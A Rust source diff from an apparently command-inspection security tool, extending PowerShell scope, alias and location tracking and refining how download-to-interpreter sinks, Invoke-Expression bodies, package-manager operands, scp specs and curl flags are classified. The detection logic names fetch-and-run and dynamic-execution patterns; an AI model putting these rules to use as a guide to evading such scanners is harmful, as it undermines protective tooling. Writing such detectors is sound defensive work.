+            if path.is_some() {
+                return PowerShellLocationTransition::Ambiguous;
+            }
+            path = static_wrapper_word(value, ShellType::PowerShell);
+            if path.is_none() {
+                return PowerShellLocationTransition::Ambiguous;
+            }
+            index += 1;
+            continue;
+        }
+        if name == "-stackname" {
+            // Named location stacks have independent history. Preserve a gap
+            // until their state is modeled instead of guessing the provider.
+            return PowerShellLocationTransition::Ambiguous;
+        }
+        if matches!(
+            name.as_str(),
+            "-erroraction"
+                | "-ea"
+                | "-errorvariable"
+                | "-ev"
+                | "-informationaction"
+                | "-infa"
+                | "-informationvariable"
+                | "-iv"
+                | "-outbuffer"
+                | "-ob"
+                | "-outvariable"
+                | "-ov"
+                | "-pipelinevariable"
+                | "-pv"
+                | "-progressaction"
+                | "-proga"
+                | "-warningaction"
+                | "-wa"
+                | "-warningvariable"
+                | "-wv"
+        ) {
+            if attached.is_none() {
+                index += 1;
+                if args.get(index).is_none() {
+                    return PowerShellLocationTransition::Ambiguous;
+                }
+            }
+            index += 1;
+            continue;
+        }
+        if matches!(
+            name.as_str(),
+            "-passthru"
+                | "-usetransaction"
+                | "-debug"
+                | "-db"
+                | "-verbose"
+                | "-vb"
+                | "-whatif"
+                | "-wi"
+                | "-confirm"
+                | "-cf"
+        ) {
+            index += 1;
+            continue;
+        }
+        return PowerShellLocationTransition::Ambiguous;
+    }
+    let dispatch = match path.as_deref() {
+        Some("+" | "-") => return PowerShellLocationTransition::Ambiguous,
+        Some(path) if powershell_dispatch_provider_path(path) => Some(true),
+        Some(path) if powershell_path_is_provider_qualified(path) => Some(false),
+        Some(_) => None,      // A relative location stays on the current provider.
+        None if kind => None, // Push the current location without changing it.
+        None => Some(false),  // Set-Location with no Path selects HOME/FileSystem.
+    };
+    if kind {
+        PowerShellLocationTransition::Push(dispatch)
+    } else {
+        PowerShellLocationTransition::Set(dispatch)
+    }
+}
+
+fn powershell_segment_has_dispatch_mutation(segment: &tokenize::Segment) -> bool {
+    if powershell_provider_variable_assignment(segment) {
+        return true;
+    }
+    if !matches!(
+        parse_powershell_function_definition(&segment.raw),
+        PowerShellFunctionParse::NotDefinition
+    ) {
+        return true;
+    }
+    let (command, args) = resolved_powershell_direct(segment);
+    matches!(
+        command.as_str(),
+        "import-alias" | "ipal" | "set-alias" | "new-alias" | "sal" | "nal" | "remove-alias"
+    ) || powershell_provider_dispatch_mutation(&command, &args, false)
+        || !matches!(
+            powershell_location_transition(
+                &command,
+                &args,
+                matches!(segment.preceding_separator.as_deref(), Some("|" | "|&")),
+            ),
+            PowerShellLocationTransition::None
+        )
+}
+
+const MAX_POWERSHELL_DISPATCH_JOIN_BODIES: usize = 128;
+
+fn powershell_dispatch_target_has_parent_scope(raw: &str) -> bool {
+    let normalized = crate::rules::command::normalize_shell_token(raw, ShellType::PowerShell);
+    let normalized = normalized
+        .trim()
+        .trim_start_matches('$')
+        .trim_start_matches('{')
+        .trim_end_matches('}')
+        .to_ascii_lowercase();
+    let (provider, path) = if let Some((provider, path)) = normalized.split_once("::") {
+        (
+            provider.rsplit(['\\', '/']).next().unwrap_or(provider),
+            path,
+        )
+    } else if let Some((provider, path)) = normalized.split_once(':') {
+        (provider, path)
+    } else {
+        return false;
+    };
+    let path = path.trim_start_matches(['\\', '/']);
+    matches!(provider, "function" | "alias")
+        && path
+            .split(':')
+            .next()
+            .is_some_and(|scope| matches!(scope, "global" | "script"))
+}
+
+fn powershell_parent_scope_value(raw: &str) -> Option<bool> {
+    let value = static_wrapper_word(raw, ShellType::PowerShell)?.to_ascii_lowercase();
+    if matches!(value.as_str(), "local" | "private")
+        || (!value.is_empty() && value.bytes().all(|byte| byte == b'0'))
+    {
+        return Some(false);
+    }
+    if matches!(value.as_str(), "global" | "script")
+        || (!value.is_empty()
+            && value.bytes().all(|byte| byte.is_ascii_digit())
+            && value.bytes().any(|byte| byte != b'0'))
+    {
+        return Some(true);
+    }
+    None
+}
+
+fn powershell_args_select_parent_scope(command: &str, args: &[String]) -> bool {
+    if !matches!(
+        command,
+        "set-alias" | "sal" | "new-alias" | "nal" | "remove-alias"
+    ) {
+        return false;
+    }
+    let mut index = 0usize;
+    while index < args.len() {
+        let normalized = crate::rules::command::normalize_powershell_parameter_token(
+            &args[index],
+            ShellType::PowerShell,
+        );
+        let lower = normalized.to_ascii_lowercase();
+        let delimiter = lower
+            .char_indices()
+            .find_map(|(offset, ch)| matches!(ch, ':' | '=').then_some(offset));
+        let (name, attached) = delimiter.map_or((lower.as_str(), None), |offset| {
+            (&lower[..offset], normalized.get(offset + 1..))
+        });
+        let scope_option = name
+            .strip_prefix('-')
+            .is_some_and(|name| !name.is_empty() && "scope".starts_with(name));
+        if !scope_option {
+            index += 1;
+            continue;
+        }
+        let value = if let Some(attached) = attached.filter(|value| !value.is_empty()) {
+            attached
+        } else {
+            index += 1;
+            let Some(value) = args.get(index) else {
+                return true;
+            };
+            value
+        };
+        return powershell_parent_scope_value(value).unwrap_or(true);
+    }
+    false
+}
+
+fn powershell_provider_variable_parent_assignment(segment: &tokenize::Segment) -> bool {
+    if !segment
+        .command
+        .as_deref()
+        .is_some_and(|command| command.trim_start().starts_with('$'))
+    {
+        return false;
+    }
+    let words = powershell_top_level_assignment_words(&segment.raw);
+    words.iter().enumerate().any(|(index, word)| {
+        let components = word.split('=').collect::<Vec<_>>();
+        let embedded = components
+            .iter()
+            .take(components.len().saturating_sub(1))
+            .map(|target| target.trim_end_matches(['?', '+', '-', '*', '/', '%']))
+            .any(|target| {
+                powershell_dispatch_variable_target(target)
+                    && powershell_dispatch_target_has_parent_scope(target)
+            });
+        embedded
+            || (powershell_dispatch_variable_target(word)
+                && powershell_dispatch_target_has_parent_scope(word)
+                && words
+                    .get(index + 1)
+                    .is_some_and(|operator| powershell_assignment_operator(operator)))
+    })
+}
+
+fn powershell_segment_has_explicit_parent_dispatch_mutation(segment: &tokenize::Segment) -> bool {
+    if let PowerShellFunctionParse::Complete(definition) =
+        parse_powershell_function_definition(&segment.raw)
+    {
+        if definition.explicit_parent_scope {
+            return true;
+        }
+    }
+    if powershell_provider_variable_parent_assignment(segment) {
+        return true;
+    }
+    let (command, args) = resolved_powershell_direct(segment);
+    match powershell_provider_path_arguments(&command, &args) {
+        Ok(paths)
+            if paths
+                .iter()
+                .any(|path| powershell_dispatch_target_has_parent_scope(path)) =>
+        {
+            return true;
+        }
+        Err(()) => return true,
+        Ok(_) => {}
+    }
+    powershell_args_select_parent_scope(&command, &args)
+}
+
+/// Recovered PowerShell bodies are analyzed independently by downstream
+/// consumers. Audit the join before claiming completeness: a child that calls
+/// a known dispatch name needs the caller's state, while a child mutation may
+/// affect the current scope but is not propagated back by the body IR.
+fn powershell_body_crosses_dispatch_state(
+    raw: &str,
+    functions: &[PowerShellFunctionDefinition],
+    aliases: &std::collections::HashMap<String, String>,
+    unresolved_aliases: &std::collections::HashSet<String>,
+    local_mutations_escape: bool,
+    runspace_mutations_escape: bool,
+    depth: usize,
+    remaining_bodies: &mut usize,
+) -> bool {
+    let mut local_functions = std::collections::HashSet::new();
+    for segment in tokenize::tokenize(raw, ShellType::PowerShell) {
+        let (resolved_command, resolved_args) = resolved_powershell_direct(&segment);
+        let location_transition = powershell_location_transition(
+            &resolved_command,
+            &resolved_args,
+            matches!(segment.preceding_separator.as_deref(), Some("|" | "|&")),
+        );
+        if powershell_segment_has_dispatch_mutation(&segment) {
+            if local_mutations_escape
+                || (runspace_mutations_escape
+                    && !matches!(location_transition, PowerShellLocationTransition::None))
+                || powershell_segment_has_explicit_parent_dispatch_mutation(&segment)
+            {
+                return true;
+            }
+            match parse_powershell_function_definition(&segment.raw) {
+                PowerShellFunctionParse::Complete(definition) => {
+                    if *remaining_bodies == 0 || depth >= MAX_SHELL_DELIMITER_DEPTH {
+                        return true;
+                    }
+                    *remaining_bodies -= 1;
+                    if powershell_body_crosses_dispatch_state(
+                        &definition.body,
+                        functions,
+                        aliases,
+                        unresolved_aliases,
+                        false,
+                        runspace_mutations_escape,
+                        depth + 1,
+                        remaining_bodies,
+                    ) {
+                        return true;
+                    }
+                    local_functions.insert(definition.name);
+                }
+                PowerShellFunctionParse::Incomplete => return true,
+                PowerShellFunctionParse::NotDefinition => {}
+            }
+            continue;
+        }
+        let (command, args) = resolved_powershell_direct(&segment);
+        let dispatch_command = if command == "." {
+            args.first()
+                .and_then(|arg| static_wrapper_word(arg, ShellType::PowerShell))
+                .map(|arg| crate::rules::command::normalize_cmd_base(&arg, ShellType::PowerShell))
+                .unwrap_or(command)
+        } else {
+            command
+        };
+        if local_functions.contains(&dispatch_command) {
+            continue;
+        }
+        if aliases.contains_key(&dispatch_command)
+            || unresolved_aliases.contains(&dispatch_command)
+            || functions
+                .iter()
+                .any(|definition| definition.name.eq_ignore_ascii_case(&dispatch_command))
+        {
+            return true;
+        }
+
+        let mut nested = ExecutableSubstitutionScan::default();
+        scan_powershell_fragment(&segment.raw, &mut nested);
+        for body in nested.bodies {
+            if *remaining_bodies == 0 || depth >= MAX_SHELL_DELIMITER_DEPTH {
+                return true;
+            }
+            *remaining_bodies -= 1;
+            if powershell_body_crosses_dispatch_state(
+                &body.input,
+                functions,
+                aliases,
+                unresolved_aliases,
+                local_mutations_escape,
+                runspace_mutations_escape,
+                depth + 1,
+                remaining_bodies,
+            ) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+fn powershell_executable_substitution_scan(raw: &str) -> ExecutableSubstitutionScan {
+    let mut scan = ExecutableSubstitutionScan::default();
+    let mut functions: Vec<PowerShellFunctionDefinition> = Vec::new();
+    let mut aliases = std::collections::HashMap::<String, String>::new();
+    let mut unresolved_aliases = std::collections::HashSet::<String>::new();
+    let mut dispatch_location = false;
+    let mut location_stack = Vec::new();
+    // The tokenizer keeps separators inside PowerShell parens/braces nested, so
+    // every fragment here begins at a real statement boundary.  This is what
+    // disambiguates postfix background `&` from unary call `&`.
+    for segment in tokenize::tokenize(raw, ShellType::PowerShell) {
+        if powershell_segment_root_is_string_data(&segment) {
+            // A bare quoted expression writes data; it does not invoke the
+            // string as a command. Expandable-string substitutions still run.
+            scan_powershell_fragment(&segment.raw, &mut scan);
+            continue;
+        }
+        match parse_powershell_function_definition(&segment.raw) {
+            PowerShellFunctionParse::Complete(definition) => {
+                functions.retain(|existing| existing.name != definition.name);
+                if functions.len() >= MAX_SHELL_DELIMITER_DEPTH {
+                    record_shell_execution_gap(
+                        &mut scan,
+                        ShellExecutionGap::AmbiguousExecutableBody,
+                    );
+                } else {
+                    functions.push(definition);
+                }
+                continue;
+            }
+            PowerShellFunctionParse::Incomplete => {
+                record_shell_execution_gap(
+                    &mut scan,
+                    ShellExecutionGap::IncompletePowerShellInvocation,
+                );
+                continue;
+            }
+            PowerShellFunctionParse::NotDefinition => {}
+        }
+        let (direct, direct_args) = resolved_powershell_direct(&segment);
+        match powershell_location_transition(
+            &direct,
+            &direct_args,
+            matches!(segment.preceding_separator.as_deref(), Some("|" | "|&")),
+        ) {
+            PowerShellLocationTransition::None => {}
+            PowerShellLocationTransition::Set(target) => {
+                if let Some(target) = target {
+                    dispatch_location = target;
+                }
+                continue;
+            }
+            PowerShellLocationTransition::Push(target) => {
+                location_stack.push(dispatch_location);
+                if let Some(target) = target {
+                    dispatch_location = target;
+                }
+                continue;
+            }
+            PowerShellLocationTransition::Pop => {
+                let Some(previous) = location_stack.pop() else {
+                    record_shell_execution_gap(
+                        &mut scan,
+                        ShellExecutionGap::AmbiguousExecutableBody,
+                    );
+                    continue;
+                };
+                dispatch_location = previous;
+                continue;
+            }
+            PowerShellLocationTransition::Ambiguous => {
+                record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+                continue;
+            }
+        }
+        if powershell_provider_variable_assignment(&segment) {
+            record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+            continue;
+        }
+        if matches!(direct.as_str(), "import-alias" | "ipal") {
+            record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+            continue;
+        }
+        if powershell_provider_dispatch_mutation(&direct, &direct_args, dispatch_location) {
+            record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+            continue;
+        }
+        if matches!(direct.as_str(), "set-alias" | "new-alias" | "sal" | "nal") {
+            record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+            if let Some((name, value)) = powershell_alias_definition(&direct_args) {
+                if let Some(value) = value {
+                    aliases.insert(name.clone(), value);
+                    unresolved_aliases.remove(&name);
+                } else {
+                    aliases.remove(&name);
+                    unresolved_aliases.insert(name);
+                }
+            } else {
+                record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+            }
+            continue;
+        }
+        if matches!(direct.as_str(), "remove-alias" | "remove-item") {
+            if direct == "remove-alias" {
+                record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+            }
+            for arg in &direct_args {
+                if let Some(name) = static_wrapper_word(arg, ShellType::PowerShell) {
+                    let name = name
+                        .strip_prefix("alias:")
+                        .unwrap_or(&name)
+                        .to_ascii_lowercase();
+                    aliases.remove(&name);
+                    unresolved_aliases.remove(&name);
+                }
+            }
+            continue;
+        }
+        let recovered_body_start = scan.bodies.len();
+        let mut child_scope_body_indices = std::collections::HashSet::new();
+        let mut isolated_body_indices = std::collections::HashSet::new();
+        if matches!(direct.as_str(), "iex" | "invoke-expression") {
+            if matches!(segment.preceding_separator.as_deref(), Some("|" | "|&")) {
+                // Pipeline input is executable text but is not represented in
+                // this segment's argv, so literal-body recovery is incomplete.
+                record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+            }
+            push_literal_powershell_expression(&direct_args, &mut scan);
+        }
+        if direct == "." {
+            match direct_args
+                .first()
+                .and_then(|arg| static_wrapper_word(arg, ShellType::PowerShell))
+            {
+                Some(target)
+                    if target.trim_start().starts_with('{')
+                        || target.trim_start().starts_with('(') => {}
+                Some(target) => {
+                    let target =
+                        crate::rules::command::normalize_cmd_base(&target, ShellType::PowerShell);
+                    if let Some(definition) = functions
+                        .iter()
+                        .rev()
+                        .find(|definition| definition.name.eq_ignore_ascii_case(&target))
+                    {
+                        scan.bodies.push(ExecutableBody {
+                            input: definition.body.clone(),
+                            shell: ShellType::PowerShell,
+                        });
+                        push_powershell_named_function_blocks(&definition.body, &mut scan);
+                    } else {
+                        // Dot-sourcing a file mutates the current scope. The
+                        // file body is not part of this source buffer.
+                        record_shell_execution_gap(
+                            &mut scan,
+                            ShellExecutionGap::AmbiguousExecutableBody,
+                        );
+                    }
+                }
+                None if !direct_args.is_empty() => record_shell_execution_gap(
+                    &mut scan,
+                    ShellExecutionGap::AmbiguousPowerShellInvocation,
+                ),
+                None => {}
+            }
+        }
+        if let Some((command, _)) =
+            resolve_wrapped_command_for_shell(&segment, ShellType::PowerShell)
+        {
+            let command =
+                crate::rules::command::normalize_cmd_base(&command, ShellType::PowerShell);
+            if let Some(target) = aliases.get(&command) {
+                let mut body = target.clone();
+                if !segment.args.is_empty() {
+                    body.push(' ');
+                    body.push_str(&segment.args.join(" "));
+                }
+                scan.bodies.push(ExecutableBody {
+                    input: body,
+                    shell: ShellType::PowerShell,
+                });
+            } else if unresolved_aliases.contains(&command) {
+                record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+            }
+            if let Some(definition) = functions
+                .iter()
+                .rev()
+                .find(|definition| definition.name.eq_ignore_ascii_case(&command))
+            {
+                let body_start = scan.bodies.len();
+                scan.bodies.push(ExecutableBody {
+                    input: definition.body.clone(),
+                    shell: ShellType::PowerShell,
+                });
+                push_powershell_named_function_blocks(&definition.body, &mut scan);
+                child_scope_body_indices.extend(body_start..scan.bodies.len());
+            }
+        }
+        let fragment_body_start = scan.bodies.len();
+        scan_powershell_fragment(&segment.raw, &mut scan);
+        let fragment_body_end = scan.bodies.len();
+        match powershell_scriptblock_scope(&direct, &direct_args) {
+            PowerShellScriptblockScope::Current => {}
+            PowerShellScriptblockScope::Child => {
+                child_scope_body_indices.extend(fragment_body_start..fragment_body_end);
+            }
+            PowerShellScriptblockScope::Isolated => {
+                isolated_body_indices.extend(fragment_body_start..fragment_body_end);
+                child_scope_body_indices.extend(fragment_body_start..fragment_body_end);
+            }
+            PowerShellScriptblockScope::Ambiguous => {
+                record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+            }
+        }
+        let mut remaining_bodies = MAX_POWERSHELL_DISPATCH_JOIN_BODIES;
+        let empty_functions = Vec::new();
+        let empty_aliases = std::collections::HashMap::new();
+        let empty_unresolved = std::collections::HashSet::new();
+        let crosses_dispatch_state =
+            scan.bodies[recovered_body_start..]
+                .iter()
+                .enumerate()
+                .any(|(offset, body)| {
+                    let body_index = recovered_body_start + offset;
+                    let isolated = isolated_body_indices.contains(&body_index);
+                    powershell_body_crosses_dispatch_state(
+                        &body.input,
+                        if isolated {
+                            &empty_functions
+                        } else {
+                            &functions
+                        },
+                        if isolated { &empty_aliases } else { &aliases },
+                        if isolated {
+                            &empty_unresolved
+                        } else {
+                            &unresolved_aliases
+                        },
+                        !child_scope_body_indices.contains(&body_index),
+                        !isolated,
+                        0,
+                        &mut remaining_bodies,
+                    )
+                });
+        if crosses_dispatch_state {
+            record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+        }
+    }
+    scan
+}
+
 /// Resolve the first segment as a tirith inspection subcommand and, when
-/// matched, return the byte range of the arg span after the subcommand word —
-/// the inert region skipped by URL extraction and Unicode-style byte scans.
+/// matched, return the byte range of the arg span after the subcommand word only
+/// when every argument is proven literal — the inert region skipped by URL
+/// extraction and Unicode-style byte scans.
 ///
 /// Returns `None` for non-tirith commands, `tirith run` (a sink — URL analysis
 /// still applies), non-inspection subcommands, and inputs that don't tokenize
@@ -1976,7 +10278,7 @@ pub fn tirith_inert_arg_range(input: &str, shell: ShellType) -> Option<std::ops:
     let first = segments.first()?;
 
     // Resolve the segment's command through wrappers — must end at "tirith".
-    let resolved = resolve_segment_command(first)?;
+    let resolved = resolve_segment_command_for_shell(first, shell)?;
     if resolved.name != "tirith" {
         return None;
     }
@@ -1985,7 +10287,7 @@ pub fn tirith_inert_arg_range(input: &str, shell: ShellType) -> Option<std::ops:
     // stripped wrapper prefixes, so start from args[0]).
     let mut sub_idx = 0;
     while sub_idx < resolved.args.len() {
-        let clean = strip_quotes(&resolved.args[sub_idx]);
+        let clean = crate::rules::command::normalize_shell_token(&resolved.args[sub_idx], shell);
         if clean.starts_with('-') {
             sub_idx += 1;
             continue;
@@ -1993,8 +10295,15 @@ pub fn tirith_inert_arg_range(input: &str, shell: ShellType) -> Option<std::ops:
         break;
     }
     let sub_arg = resolved.args.get(sub_idx)?;
-    let subcommand = command_base_name(sub_arg);
+    let subcommand = command_base_name_for_shell(sub_arg, shell);
     if !is_tirith_inspection_subcommand(&subcommand) {
+        return None;
+    }
+
+    if !resolved.args[sub_idx + 1..]
+        .iter()
+        .all(|arg| shell_word_is_proven_literal(arg, shell))
+    {
         return None;
     }
 
@@ -2034,12 +10343,12 @@ fn find_subcommand_token(haystack: &str, needle: &str) -> Option<usize> {
 }
 
 /// Check if a segment is in a "sink" context (executing/downloading).
-fn is_sink_context(segment: &Segment, _all_segments: &[Segment]) -> bool {
-    if let Some(cmd) = resolve_segment_command(segment) {
+fn is_sink_context(segment: &Segment, _all_segments: &[Segment], shell: ShellType) -> bool {
+    if let Some(cmd) = resolve_segment_command_for_shell(segment, shell) {
         let cmd_lower = cmd.name;
         // git is only a sink for download subcommands (clone, fetch, pull, etc.)
         if cmd_lower == "git" {
-            return is_git_sink(cmd.args);
+            return is_git_sink(&cmd.args, shell);
         }
         if is_source_command(&cmd_lower) {
             return true;
@@ -2050,8 +10359,17 @@ fn is_sink_context(segment: &Segment, _all_segments: &[Segment]) -> bool {
     if let Some(sep) = &segment.preceding_separator {
         if sep == "|" || sep == "|&" {
             // This segment receives piped input — check if it's an interpreter
-            if let Some(cmd) = resolve_segment_command(segment) {
+            if let Some(cmd) = resolve_segment_command_for_shell(segment, shell) {
                 if is_interpreter(&cmd.name) {
+                    if shell == ShellType::Posix {
+                        let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+                        return posix_command_accepts_pipeline_as_code(
+                            &cmd.name,
+                            &cmd.args,
+                            0,
+                            &mut remaining_bodies,
+                        );
+                    }
                     return true;
                 }
             }
@@ -2091,6 +10409,193 @@ fn is_source_command(cmd: &str) -> bool {
     )
 }
 
+fn registry_package_name(raw: &str) -> bool {
+    let (name, selector) = if let Some(scoped) = raw.strip_prefix('@') {
+        let Some(slash) = scoped.find('/') else {
+            return false;
+        };
+        let selector_at = scoped[slash + 1..]
+            .find('@')
+            .map(|offset| slash + 1 + offset);
+        match selector_at {
+            Some(index) => (&raw[..index + 1], Some(&raw[index + 2..])),
+            None => (raw, None),
+        }
+    } else {
+        raw.split_once('@')
+            .map_or((raw, None), |(name, selector)| (name, Some(selector)))
+    };
+    if selector.is_some_and(|selector| {
+        selector.is_empty()
+            || selector
+                .bytes()
+                .any(|byte| matches!(byte, b'/' | b'\\' | b':' | b'@' | b'?' | b'#'))
+    }) {
+        return false;
+    }
+    let valid_component = |component: &str| {
+        !component.is_empty()
+            && !component.starts_with('.')
+            && !component.starts_with('_')
+            && component
+                .bytes()
+                .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-'))
+    };
+    if let Some(scoped) = name.strip_prefix('@') {
+        let mut components = scoped.split('/');
+        let valid = components.next().is_some_and(valid_component)
+            && components.next().is_some_and(valid_component);
+        valid && components.next().is_none()
+    } else {
+        !name.contains('/') && valid_component(name)
+    }
+}
+
+fn package_option_value(args: &[String], index: usize, shell: ShellType) -> bool {
+    if index == 0 {
+        return false;
+    }
+    let previous =
+        crate::rules::command::normalize_shell_token(&args[index - 1], shell).to_ascii_lowercase();
+    matches!(
+        previous.as_str(),
+        "--registry"
+            | "--workspace"
+            | "--prefix"
+            | "--cache"
+            | "--userconfig"
+            | "--tag"
+            | "--omit"
+            | "--include"
+            | "--filter"
+            | "--dir"
+            | "--cwd"
+            | "--config"
+            | "-c"
+            | "-w"
+            | "-C"
+    )
+}
+
+fn first_package_runner_operand(args: &[String], start: usize, shell: ShellType) -> Option<usize> {
+    let mut index = start;
+    while index < args.len() {
+        let arg = crate::rules::command::normalize_shell_token(&args[index], shell);
+        if arg == "--" {
+            return (index + 1 < args.len()).then_some(index + 1);
+        }
+        if arg == "--package" || arg == "-p" {
+            index = index.saturating_add(2);
+            continue;
+        }
+        if arg.starts_with("--package=") || (arg.starts_with("-p") && arg.len() > 2) {
+            index += 1;
+            continue;
+        }
+        if arg.starts_with('-') {
+            index += if matches!(
+                arg.as_str(),
+                "--registry"
+                    | "--workspace"
+                    | "--prefix"
+                    | "--cache"
+                    | "--userconfig"
+                    | "--tag"
+                    | "--filter"
+                    | "--dir"
+                    | "--cwd"
+                    | "--config"
+                    | "-c"
+                    | "-w"
+                    | "-C"
+            ) {
+                2
+            } else {
+                1
+            };
+            continue;
+        }
+        return Some(index);
+    }
+    None
+}
+
+/// Package-manager registry specs such as `eslint.config@^1` contain dots but
+/// are not schemeless network destinations. This classifier is deliberately
+/// positional and grammar-bounded: URL/tarball operands that contain a host
+/// plus path remain eligible for normal URL inspection.
+fn is_registry_package_operand(
+    command: &str,
+    args: &[String],
+    index: usize,
+    shell: ShellType,
+) -> bool {
+    let Some(raw) = args
+        .get(index)
+        .map(|arg| crate::rules::command::normalize_shell_token(arg, shell))
+    else {
+        return false;
+    };
+    if raw.starts_with('-') || package_option_value(args, index, shell) {
+        return false;
+    }
+    if has_leading_uri_scheme(&raw) || raw.starts_with("//") || !registry_package_name(&raw) {
+        return false;
+    }
+
+    let normalized: Vec<String> = args
+        .iter()
+        .map(|arg| crate::rules::command::normalize_shell_token(arg, shell).to_ascii_lowercase())
+        .collect();
+    match command {
+        "npm" => {
+            let Some(subcommand) = normalized.first() else {
+                return false;
+            };
+            if matches!(subcommand.as_str(), "exec" | "x") {
+                return first_package_runner_operand(args, 1, shell) == Some(index)
+                    || (index > 0 && matches!(normalized[index - 1].as_str(), "--package" | "-p"));
+            }
+            index > 0
+                && matches!(
+                    subcommand.as_str(),
+                    "install" | "i" | "add" | "update" | "up" | "uninstall" | "remove" | "rm"
+                )
+        }
+        "npx" => {
+            first_package_runner_operand(args, 0, shell) == Some(index)
+                || (index > 0 && matches!(normalized[index - 1].as_str(), "--package" | "-p"))
+        }
+        "pnpm" => {
+            let Some(subcommand) = normalized.first() else {
+                return false;
+            };
+            if matches!(subcommand.as_str(), "dlx" | "exec" | "create") {
+                return first_package_runner_operand(args, 1, shell) == Some(index);
+            }
+            index > 0
+                && matches!(
+                    subcommand.as_str(),
+                    "add" | "install" | "i" | "update" | "up" | "remove" | "rm"
+                )
+        }
+        "yarn" => {
+            let Some(subcommand) = normalized.first() else {
+                return false;
+            };
+            if matches!(subcommand.as_str(), "dlx" | "create") {
+                return first_package_runner_operand(args, 1, shell) == Some(index);
+            }
+            index > 0
+                && matches!(
+                    subcommand.as_str(),
+                    "add" | "install" | "upgrade" | "up" | "remove"
+                )
+        }
+        _ => false,
+    }
+}
+
 /// Parsed scp/rsync remote spec of shape `[user@]host:path`, returned by
 /// [`parse_scp_remote_spec`] so callers (e.g. `network_deny`) can route on the
 /// host without re-parsing. `path` is the literal remainder after the first
@@ -2103,15 +10608,17 @@ pub struct ScpRemoteSpec {
 }
 
 /// Parse `[user@]host:path` from an scp/rsync argument. Accepts `host:path` and
-/// `user@host:path`; rejects flags, `://` URLs, `:` preceded by `/` (absolute
-/// local path), empty/`/`-containing hosts, and Windows drive-letter shapes.
+/// `user@host:path`; rejects flags, a valid URI scheme at byte zero, `:`
+/// preceded by `/` (absolute local path), empty/`/`-containing hosts, and
+/// Windows drive-letter shapes. A `://` sequence after the SCP separator is
+/// part of the remote path and remains valid.
 ///
 /// Windows drive-letter guard — narrow so it doesn't break legitimate one-letter
 /// SSH aliases (`scp file x:/tmp/`): `X:\...` rejected ALWAYS; `X:/...` rejected
 /// only on PowerShell/Cmd (POSIX treats it as an alias); `X:foo` accepted
 /// everywhere (ambiguous with scp's `x:relative-path`; back-compat wins).
 pub fn parse_scp_remote_spec(arg: &str, shell: ShellType) -> Option<ScpRemoteSpec> {
-    if arg.is_empty() || arg.starts_with('-') || arg.contains("://") {
+    if arg.is_empty() || arg.starts_with('-') || has_leading_uri_scheme(arg) {
         return None;
     }
 
@@ -2178,6 +10685,15 @@ pub fn parse_scp_remote_spec(arg: &str, shell: ShellType) -> Option<ScpRemoteSpe
     })
 }
 
+fn has_leading_uri_scheme(raw: &str) -> bool {
+    let Some((scheme, _)) = raw.split_once("://") else {
+        return false;
+    };
+    let mut chars = scheme.chars();
+    chars.next().is_some_and(|ch| ch.is_ascii_alphabetic())
+        && chars.all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '+' | '-' | '.'))
+}
+
 fn is_valid_scp_host(host: &str) -> bool {
     !host.is_empty()
         && !host.contains('/')
@@ -2189,13 +10705,13 @@ fn is_valid_scp_host(host: &str) -> bool {
 
 /// Check if a git command is in a sink context (only subcommands that download).
 /// `git add`, `git commit`, `git status`, etc. are NOT sinks.
-fn is_git_sink(args: &[String]) -> bool {
+fn is_git_sink(args: &[String], shell: ShellType) -> bool {
     if args.is_empty() {
         return false;
     }
     // First non-flag arg is the subcommand
     for arg in args {
-        let clean = strip_quotes(arg);
+        let clean = crate::rules::command::normalize_shell_token(arg, shell);
         if clean.starts_with('-') {
             continue;
         }
@@ -2225,27 +10741,201 @@ fn is_interpreter(cmd: &str) -> bool {
     )
 }
 
-/// Whether the arg at `arg_index` is an output-file/credential flag value (which
-/// can look like a domain) and should be skipped during schemeless URL detection.
-fn is_output_flag_value(cmd: &str, args: &[String], arg_index: usize) -> bool {
+fn short_option_cluster_consumes_following(token: &str, value_options: &[char]) -> bool {
+    let Some(options) = token
+        .strip_prefix('-')
+        .filter(|options| !options.is_empty() && !options.starts_with('-'))
+    else {
+        return false;
+    };
+    for (offset, option) in options.char_indices() {
+        if value_options.contains(&option) {
+            return offset + option.len_utf8() == options.len();
+        }
+    }
+    false
+}
+
+/// Whether the arg at `arg_index` is a proven non-destination flag value (which
+/// can look like a domain) and should be skipped during schemeless URL detection
+/// and network-policy destination matching.
+fn is_non_destination_flag_value(
+    cmd: &str,
+    args: &[String],
+    arg_index: usize,
+    shell: ShellType,
+) -> bool {
     let cmd_lower = cmd.to_lowercase();
     let cmd_base = cmd_lower.rsplit('/').next().unwrap_or(&cmd_lower);
 
     match cmd_base {
         "curl" => {
             if arg_index > 0 {
-                let prev = strip_quotes(&args[arg_index - 1]);
-                if prev == "-o"
-                    || prev == "--output"
-                    || prev == "-u"
-                    || prev == "--user"
-                    || prev == "-U"
-                    || prev == "--proxy-user"
-                {
+                let prev =
+                    crate::rules::command::normalize_shell_token(&args[arg_index - 1], shell);
+                if matches!(
+                    prev.as_str(),
+                    "-o" | "--output"
+                        | "-T"
+                        | "--upload-file"
+                        | "-u"
+                        | "--user"
+                        | "-U"
+                        | "--proxy-user"
+                        | "-d"
+                        | "--data"
+                        | "--data-ascii"
+                        | "--data-binary"
+                        | "--data-raw"
+                        | "--data-urlencode"
+                        | "--json"
+                        | "-H"
+                        | "--header"
+                        | "--proxy-header"
+                        | "-F"
+                        | "--form"
+                        | "--form-string"
+                        | "-K"
+                        | "--config"
+                        | "-b"
+                        | "--cookie"
+                        | "-c"
+                        | "--cookie-jar"
+                        | "-e"
+                        | "--referer"
+                        | "-A"
+                        | "--user-agent"
+                        | "-X"
